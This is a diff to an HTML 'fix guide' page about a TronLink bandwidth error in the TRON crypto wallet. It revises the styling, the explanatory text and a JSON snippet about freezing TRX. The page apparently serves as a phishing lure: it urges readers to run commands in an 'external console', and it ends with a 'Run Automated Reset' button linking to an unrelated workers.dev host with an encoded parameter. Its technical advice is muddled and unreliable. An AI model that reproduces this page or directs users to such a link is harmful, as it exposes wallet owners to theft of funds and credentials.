@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tronlink Bandwidth Error – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #121214;
+        font-family: sans-serif;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #cf6679; }
     .btn {
-        background: #00adb5;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,33 +42,34 @@
 <h1>Tronlink Bandwidth Error</h1>
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters an error message indicating a Tronlink bandwidth issue, preventing them from completing transactions or interacting with the TRON network.</li>
+<li>Users encounter an error message indicating a TronLink bandwidth issue, preventing them from completing transactions on the TRON network. The error message may appear when attempting to send TRX, tokens, or interact with smart contracts.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth or an incorrect configuration in the Tronlink wallet, which is necessary for transaction processing on the TRON blockchain.</li>
+<li>The error occurs due to insufficient bandwidth or energy on the user's TRON account, which is required to process transactions on the network. This can happen when the account's bandwidth or energy is depleted, often due to recent transaction activity.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the bandwidth limit in the Tronlink wallet settings to allow for more transactions.</li>
-<li>Check for any pending transactions and confirm or cancel them to free up bandwidth.</li>
-<li>Update the Tronlink wallet to the latest version, which may include fixes for bandwidth-related issues.</li>
+<li>Increase the account's bandwidth by freezing TRX for bandwidth:</li>
+<li>Freeze a minimum of 100 TRX to obtain additional bandwidth</li>
+<li>Use the TRON wallet to freeze TRX and obtain bandwidth</li>
+<li>Configure the following JSON to update the account's bandwidth parameters:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;bandwidth&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;limit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10000</span>
-<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user_tron_address&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;frozen_balance&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;frozen_duration&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for advanced troubleshooting and configuration adjustments.</p>
+<p>Consider utilizing an external console to execute these commands for more flexibility. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A TRON wallet with a sufficient balance</li>
-<li>The latest version of the Tronlink wallet</li>
-<li>A stable internet connection</li>
+<li>A TRON wallet with a sufficient TRX balance</li>
+<li>Basic understanding of TRON's bandwidth and energy system</li>
+<li>Recent transaction history to identify potential bandwidth depletion causes</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-unable-to-cancel-pending-transaction-due.html">Metamask Extension Bug Unable To Cancel Pending Transaction Due</a></li><li><a href="./archive/2026/06/metamask-extension-bug-after-sending-a-transaction-on-custom-ne.html">Metamask Extension Bug After Sending A Transaction On Custom Network</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-unable-to-cancel-pending-transaction-due.html">Metamask Extension Bug Unable To Cancel Pending Transaction Due</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
